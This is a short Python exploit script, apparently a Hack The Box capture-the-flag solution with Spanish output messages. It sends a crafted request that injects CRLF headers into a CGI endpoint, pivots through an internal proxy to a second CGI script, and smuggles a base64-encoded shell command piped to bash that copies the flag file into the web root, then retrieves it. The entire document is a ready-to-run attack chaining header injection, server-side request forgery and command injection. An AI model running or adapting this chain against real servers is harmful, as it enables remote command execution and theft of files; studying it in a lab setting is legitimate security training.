# By GuchiHacker

import sys
import requests
import re
from base64 import b64encode
from urllib.parse import quote

def get_flag(target):
    try:
        ip, port = target.split(":")
        base_url = f"http://{ip}:{port}"
        
        def dquote(s):
            return quote(''.join([f'%{hex(ord(c))[2:]}' for c in s]))
        
        payload = b64encode(b'cat /flag* > /var/www/html/flag.txt').decode()
        encoded_payload = dquote(f"%; echo \"{payload}\" | base64 -d | bash")
        
        attack_url = (
            f"{base_url}/cgi-bin/attack-domain?name=example.com%0D%0ALocation:/asd/%0D%0A"
            f"Content-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip?target=::1{encoded_payload}%26name=abc%3F%0D%0A%0D%0A&target=x"
        )
        
        response = requests.get(attack_url, verify=False)
        response.raise_for_status()
        
        flag_url = f"{base_url}/flag.txt"
        flag_response = requests.get(flag_url, verify=False)
        flag_response.raise_for_status()
        
        flag_match = re.search(r'HTB\{.*?\}', flag_response.text)
        if flag_match:
            print("Flag encontrada:", flag_match.group(0))
        else:
            print("No se encontr√≥ la flag en la respuesta.")
    
    except Exception as e:
        print("Error:", str(e))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python {sys.argv[0]} <IP:PUERTO>")
    else:
        get_flag(sys.argv[1])
